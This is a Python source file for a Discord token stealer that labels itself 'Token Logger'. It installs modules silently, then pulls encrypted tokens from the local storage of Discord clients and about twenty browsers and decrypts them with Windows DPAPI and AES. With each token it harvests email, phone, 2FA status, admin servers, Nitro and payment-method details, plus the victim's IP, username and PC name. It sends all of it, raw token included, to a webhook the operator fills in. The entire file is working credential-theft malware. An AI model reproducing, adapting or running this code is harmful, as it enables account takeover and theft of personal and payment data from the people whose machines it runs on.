import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime

def install_required_modules(modules_to_install):
    for module_name, pip_name in modules_to_install:
        try:
            __import__(module_name)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_required_modules([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

import win32crypt
from Crypto.Cipher import AES

LOCAL_APPDATA = os.getenv("LOCALAPPDATA")
ROAMING_APPDATA = os.getenv("APPDATA")
BROWSER_PATHS = {
    'Discord': ROAMING_APPDATA + '\\discord',
    'Discord Canary': ROAMING_APPDATA + '\\discordcanary',
    'Lightcord': ROAMING_APPDATA + '\\Lightcord',
    'Discord PTB': ROAMING_APPDATA + '\\discordptb',
    'Opera': ROAMING_APPDATA + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING_APPDATA + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL_APPDATA + '\\Amigo\\User Data',
    'Torch': LOCAL_APPDATA + '\\Torch\\User Data',
    'Kometa': LOCAL_APPDATA + '\\Kometa\\User Data',
    'Orbitum': LOCAL_APPDATA + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL_APPDATA + '\\CentBrowser\\User Data',
    '7Star': LOCAL_APPDATA + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL_APPDATA + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL_APPDATA + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL_APPDATA + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL_APPDATA + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL_APPDATA + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL_APPDATA + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL_APPDATA + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL_APPDATA + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL_APPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL_APPDATA + '\\Iridium\\User Data\\Default'
}

def create_request_headers(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def find_discord_tokens(storage_path):
    storage_path += "\\Local Storage\\leveldb\\"
    found_tokens = []

    if not os.path.exists(storage_path):
        return found_tokens

    for file in os.listdir(storage_path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{storage_path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        found_tokens.append(values)
        except PermissionError:
            continue

    return found_tokens
    
def get_encryption_key(browser_path):
    with open(browser_path + f"\\Local State", "r") as file:
        encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return encrypted_key

def get_public_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def main():
    processed_tokens = []

    for browser_name, browser_path in BROWSER_PATHS.items():
        if not os.path.exists(browser_path):
            continue

        for token in find_discord_tokens(browser_path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                # Decrypt the token
                decrypted_token = AES.new(
                    win32crypt.CryptUnprotectData(
                        base64.b64decode(get_encryption_key(browser_path))[5:], 
                        None, None, None, 0
                    )[1], 
                    AES.MODE_GCM, 
                    base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]
                ).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                
                if decrypted_token in processed_tokens:
                    continue
                processed_tokens.append(decrypted_token)

                # Get user profile
                profile_response = urllib.request.urlopen(
                    urllib.request.Request(
                        'https://discord.com/api/v10/users/@me', 
                        headers=create_request_headers(decrypted_token)
                    )
                )
                if profile_response.getcode() != 200:
                    continue
                profile_data = json.loads(profile_response.read().decode())

                # Process badges
                user_badges = ""
                user_flags = profile_data['flags']
                if user_flags == 64 or user_flags == 96:
                    user_badges += ":BadgeBravery: "
                if user_flags == 128 or user_flags == 160:
                    user_badges += ":BadgeBrilliance: "
                if user_flags == 256 or user_flags == 288:
                    user_badges += ":BadgeBalance: "

                # Get friends count
                friends_response = json.loads(urllib.request.urlopen(
                    urllib.request.Request(
                        'https://discordapp.com/api/v6/users/@me/relationships', 
                        headers=create_request_headers(decrypted_token)
                    )
                ).read().decode())
                friends_count = len([x for x in friends_response if x['type'] == 1])

                # Get guilds info
                guilds_params = urllib.parse.urlencode({"with_counts": True})
                guilds_response = json.loads(urllib.request.urlopen(
                    urllib.request.Request(
                        f'https://discordapp.com/api/v6/users/@me/guilds?{guilds_params}', 
                        headers=create_request_headers(decrypted_token)
                    )
                ).read().decode())
                guilds_count = len(guilds_response)
                guilds_info = ""

                for guild in guilds_response:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        guild_details = json.loads(urllib.request.urlopen(
                            urllib.request.Request(
                                f'https://discordapp.com/api/v6/guilds/{guild["id"]}', 
                                headers=create_request_headers(decrypted_token)
                            )
                        ).read().decode())
                        vanity_url = ""

                        if guild_details["vanity_url_code"] != None:
                            vanity_url = f"""; .gg/{guild_details["vanity_url_code"]}"""

                        guilds_info += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity_url}"""
                if guilds_info == "":
                    guilds_info = "No guilds"

                # Get nitro info
                nitro_response = json.loads(urllib.request.urlopen(
                    urllib.request.Request(
                        'https://discordapp.com/api/v6/users/@me/billing/subscriptions', 
                        headers=create_request_headers(decrypted_token)
                    )
                ).read().decode())
                has_nitro = bool(len(nitro_response) > 0)
                nitro_expiry = None
                if has_nitro:
                    user_badges += f":BadgeSubscriber: "
                    nitro_expiry = datetime.datetime.strptime(
                        nitro_response[0]["current_period_end"], 
                        "%Y-%m-%dT%H:%M:%S.%f%z"
                    ).strftime('%d/%m/%Y at %H:%M:%S')

                # Get boost info
                boosts_response = json.loads(urllib.request.urlopen(
                    urllib.request.Request(
                        'https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', 
                        headers=create_request_headers(decrypted_token)
                    )
                ).read().decode())
                available_boosts = 0
                boost_details = ""
                has_boosts = False
                for boost in boosts_response:
                    cooldown = datetime.datetime.strptime(
                        boost["cooldown_ends_at"], 
                        "%Y-%m-%dT%H:%M:%S.%f%z"
                    )
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        boost_details += f"ㅤ- Available now\n"
                        available_boosts += 1
                    else:
                        boost_details += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    has_boosts = True
                if has_boosts:
                    user_badges += f":BadgeBoost: "

                # Get payment methods
                payment_methods_count = 0
                payment_types = ""
                valid_methods = 0
                for method in json.loads(urllib.request.urlopen(
                    urllib.request.Request(
                        'https://discordapp.com/api/v6/users/@me/billing/payment-sources', 
                        headers=create_request_headers(decrypted_token)
                    )
                ).read().decode()):
                    if method['type'] == 1:
                        payment_types += "CreditCard "
                        if not method['invalid']:
                            valid_methods += 1
                        payment_methods_count += 1
                    elif method['type'] == 2:
                        payment_types += "PayPal "
                        if not method['invalid']:
                            valid_methods += 1
                        payment_methods_count += 1

                # Format nitro info for webhook
                nitro_info = f"\nNitro Details:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {nitro_expiry}\nBoosts Available: {available_boosts}\n{boost_details if has_boosts else ''}\n```"
                boost_info_only = f"\nNitro Details:\n```yaml\nBoosts Available: {available_boosts}\n{boost_details if has_boosts else ''}\n```"
                
                # Format payment info for webhook
                payment_info = f"\nPayment Methods:\n```yaml\nTotal Methods: {payment_methods_count}\nValid Methods: {valid_methods} method(s)\nTypes: {payment_types}\n```"
                
                # Create webhook embed
                webhook_data = {
                    'embeds': [
                        {
                            'title': f"🔍 Discord Account Info - {profile_data['username']}",
                            'description': f"""
**Basic Information**
```yaml
User ID: {profile_data['id']}
Email: {profile_data['email']}
Phone: {profile_data['phone']}
Badges: {user_badges if user_badges else 'None'}

Friends: {friends_count}
Servers: {guilds_count}
Admin Servers: {guilds_info}
```

**Account Security**
```yaml
2FA Enabled: {profile_data['mfa_enabled']}
Flags: {user_flags}
Locale: {profile_data['locale']}
Verified: {profile_data['verified']}
```

{nitro_info if has_nitro else boost_info_only if available_boosts > 0 else ""}
{payment_info if payment_methods_count > 0 else ""}

**System Information**
```yaml
IP Address: {get_public_ip()}
Windows User: {os.getenv("UserName")}
PC Name: {os.getenv("COMPUTERNAME")}
Token Source: {browser_name}
```

**Token**
```yaml
{decrypted_token}
```""",
                            'color': 8719319,
                            'footer': {
                                'text': "Token Logger made by CrystalRebirth inspired by AstraaDev"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{profile_data['id']}/{profile_data['avatar']}.png"
                            }
                        }
                    ],
                    "username": "Token Logger",
                    "avatar_url": "https://imgur.com/TxirVuU"
                }

                # Send to webhook - REPLACE 'YOUR_WEBHOOK_URL_HERE' with your actual Discord webhook URL
                urllib.request.urlopen(
                    urllib.request.Request(
                        'YOUR_WEBHOOK_HERE', 
                        data=json.dumps(webhook_data).encode('utf-8'), 
                        headers=create_request_headers(), 
                        method='POST'
                    )
                ).read().decode()
            except urllib.error.HTTPError or json.JSONDecodeError:
                continue
            except Exception as e:
                print(f"ERROR: {e}")
                continue

if __name__ == "__main__":
    main()
